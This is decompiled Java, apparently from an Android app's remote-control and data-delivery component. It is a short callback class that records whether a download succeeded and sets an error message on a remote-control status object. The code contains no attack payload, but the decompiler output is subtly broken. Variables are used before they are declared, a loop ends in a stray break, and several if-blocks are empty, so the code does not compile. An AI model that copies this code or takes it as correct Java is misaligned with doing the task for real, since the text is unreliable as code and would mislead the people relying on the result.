package com.vvt.appengine.a;

import android.os.ConditionVariable;
import com.vvt.ag.b;
import com.vvt.datadeliverymanager.a.a;
import com.vvt.datadeliverymanager.i;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

class br
  implements a
{
  br(bq parambq) {}
  
  public void a(i parami)
  {
    boolean bool = bq.a();
    if (bool) {}
  }
  
  public void b(i parami)
  {
    boolean bool1 = bq.a();
    if (bool1) {}
    bool1 = parami.f();
    if (bool1)
    {
      localObject = bq.a(this.a);
      bool2 = true;
      ((RmtCtrlOutputStatusMessage)localObject).setSuccess(bool2);
      bq.b(this.a).open();
      return;
    }
    Object localObject = bq.a(this.a);
    boolean bool2 = false;
    RmtCtrlOutputStatusMessage localRmtCtrlOutputStatusMessage = null;
    ((RmtCtrlOutputStatusMessage)localObject).setSuccess(false);
    localObject = parami.e();
    bool1 = b.a((String)localObject);
    if (bool1) {}
    for (localObject = "Error downloading";; localObject = parami.e())
    {
      localRmtCtrlOutputStatusMessage = bq.a(this.a);
      localRmtCtrlOutputStatusMessage.setMessage((String)localObject);
      break;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/br.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */